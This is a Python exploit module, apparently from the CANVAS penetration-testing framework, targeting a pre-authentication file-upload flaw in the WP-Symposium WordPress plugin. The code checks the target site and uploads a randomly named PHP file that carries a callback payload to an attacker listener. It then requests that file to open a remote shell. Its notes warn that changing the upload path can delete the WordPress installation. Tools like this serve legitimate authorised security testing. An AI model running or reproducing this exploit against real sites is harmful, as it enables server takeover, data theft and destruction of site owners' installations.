#! /usr/bin/env python
#
# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2014
# http://www.immunityinc.com/CANVAS/ for more information
#

import sys
import os
import socket
import time
import re
import string
import random
import urllib
import urllib2

if "." not in sys.path:
    sys.path.append(".")

import timeoutsocket
import canvasengine

import libs.spkproxy as spkproxy

from exploitutils import *
from canvasexploit import canvasexploit
from tcpexploit import tcpexploit
from contextlib import contextmanager
from phplistener import get_php_stage1

NAME                            = "WP-Symposium RCE"
DESCRIPTION                     = "WP-Symposium Pre-Auth Remote Shell Upload"
VERSION                         = "1.0"

DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "www.wpsymposium.com"
DOCUMENTATION["Date public"]   = "12/12/2014"
DOCUMENTATION["CERT Advisory"] = "None"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["References"]    = "http://packetstormsecurity.com/files/129505/WordPress-WP-Symposium-14.11-Shell-Upload.html"
DOCUMENTATION["CVE Name"]      = "CWE-434"
DOCUMENTATION["Notes"]         = """

WP-Symposium is a social networking plugin for WordPress with ~150k downloads as of 12/12/2014.

This is an exceptionally straight forward shell upload bug. The one 'gotcha' is that we assume
wp-content/plugins/wp-symposium/server/php/ is writable by the web server. This may not always
be the case so if the exploit fails that should be the first thing you examine.

Be forewarned! The UploadHandler.php::handle_file_upload() can recursively remove directories!
If you play with the path (see the uploader_dir variable in the uploadShell function of this module)
you may end up wiping the WordPress installation depending on permissions.
"""

PROPERTY            = {}
PROPERTY["TYPE"]    = "Web Exploits"
PROPERTY["SITE"]    =  "Remote"
PROPERTY["ARCH"]    = [["Linux"]]
PROPERTY["VERSION"] = []

targets = {}


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name       = NAME
        self.debug      = False
        self.ssl        = None
        self.url        = None
        self.hostname   = None # In the case of vhosts
        self.charSet    = string.lowercase + string.digits
        self.shellFile  = ''.join(random.sample(self.charSet * 8, 8))

    def getargs(self):
        self.getarg("ssl")
        if self.ssl != "True" or self.ssl != "true":
            self.ssl = False

        self.getarg("url")
        if "/index.php" in self.url:
            self.url.replace("/index.php", "/")
        if self.url[-1] != "/":
             self.url = self.url + "/"

        self.getarg("hostname")

        self.node = self.argsDict["passednodes"][0]

        return

    def neededListenerTypes(self):
        return [canvasengine.PHPMULTI]

    def usage(self):
        """
        We need a bit more information than just the target's IP
        """
        print "=" * 10
        print "Pre-auth shell upload vulnerability in the WP-Symposium plugin for Wordpress 14.11"
        print "-O url:<path to wordpress>" # ex: wordpress/
        print "-O ssl:<True/False>"
        print "-O hostname:<hostname>      # If no DNS record is present for the host, use the IP"
        print "=" * 10

    def testUrl(self):
        """
        Let's make sure the supplied host is reachable and looks like a wordpress page
        """
        # Make the request
        try:
            if self.ssl:
                testUrl = "https://" + self.hostname + self.url + "wp-login.php"
            else:
                testUrl = "http://" + self.hostname + self.url + "wp-login.php"
            self.log("[+] Checking that %s is the WordPress login page" % testUrl)
            (testResponse, testCode) = spkproxy.urlopen(testUrl,
                                       verb = "GET",
                                       hostname = self.hostname,
                                       exploit = self,
                                       entireresponse = True,
                                       return_response_code = True)
            resData = testResponse.read()
        except IOError as e:
            self.log("[EE] Failed to connect to provided URL (%s)" % testUrl)
            self.log(e.strerror)

        # Test the results
        if testCode == -1:
            self.log("[EE] Unable to contact the server at %s" % testUrl)
        elif testCode != 200:
            self.log("[ii] Received an HTTP STATUS CODE of %d" % testCode)
            self.log("[ii] Visit %s and ensure it is the WordPress login page" % testCode)
        elif re.search("Lost your password", resData, re.IGNORECASE):
            self.log("[ii] Found the WordPress login page, proceeding")
            self.url = testUrl.replace("wp-login.php", "")
            return True
        else:
            self.log("[EE] Didn't find the expected WordPress login page, aborting")
            self.log("[ii] Visit %s and ensure it is the WordPress login page" % testUrl)

        return False

    def uploadShell(self, exheaders):
        """
        Simplest shell upload ever, just POST to the page :)
        """
        # Generate the PHP callback
        host        = self.callback.ip
        port        = self.callback.port
        badChars    = ""

        # This is the code that'll be inserted on the remote machine
        # if you want a custom shell do it here
        ret = "<?php " + get_php_stage1(badChars, host, port) + " ?>"

        # Create our payload to POST
        payload = ""
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"uploader_uid\"\r\n"
        payload += "\r\n1\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"uploader_dir\"\r\n"
        payload += "\r\n\r\n"      # Giving this a directory like (./) will wipe that directory :(
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"uploader_url\"\r\n"
        payload += "\r\n" + self.url + "wp-content/plugins/wp-symposium/server/php\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"files[]\"; filename=\"%s.php\"\r\n" % self.shellFile
        payload += "Content-Type: application/octet-stream\r\n\r\n"
        payload += "%s\r\n" % ret
        payload += "--576a5sdf6--\r\n"


        # Update connection parameters
        exheaders.remove(("Content-Type", "application/x-www-form-urlencoded"))
        exheaders.append(("Content-Type", "multipart/form-data; boundary=576a5sdf6"))

        # Make the POST
        (res, code) = spkproxy.urlopen(self.url + "wp-content/plugins/wp-symposium/server/php/",
                                       extraheaders = exheaders,
                                       data = payload,
                                       verb = "POST",
                                       hostname = self.hostname,
                                       exploit = self,
                                       entireresponse = False,
                                       return_response_code = True)
        # Check for failure
        text = res.read()
        if re.search("error", text):
            self.log("[EE] The wp-content/plugins/wp-symposium/server/php/ directory may not be writable, see exploit notes for more information")
            return False
        else:
            self.log("[ii] Shell upload seems to have been successful")
        return True

    def trigger(self):
        """
        Visit our callback
        """
        url = self.url + "wp-content/plugins/wp-symposium/server/php/%s.php" % self.shellFile
        self.log("[+] Trying to visit %s" % url)
        (trigResp, trigCode) = spkproxy.urlopen(url, verb = "GET", hostname = self.hostname, entireresponse = True, return_response_code = True)
        if trigCode != 200:
           self.log("[ii] Received HTTP STATUS CODE of %d" % trigCode)
           self.log("[EE] Our upload failed for an unknown reason")
        else:
           self.log("[ii] Upload succeeded")
           return True

        return False

    def run(self):
        self.getargs()

        if self.testUrl():
            exheaders = [("Content-Type", "application/x-www-form-urlencoded"), ("Connection", "keep-alive")]
            self.uploadShell(exheaders)
            if self.trigger():
                return True
        return False


if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
